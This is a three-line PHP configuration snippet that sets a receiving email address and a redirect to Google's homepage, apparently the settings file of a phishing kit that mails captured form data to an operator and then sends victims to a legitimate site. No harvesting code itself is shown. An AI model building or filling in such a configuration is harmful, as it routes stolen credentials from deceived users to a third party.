<?php 
$Receive_email="lindsayinrosa@gmail.com";
$redirect="https://www.google.com/";
?>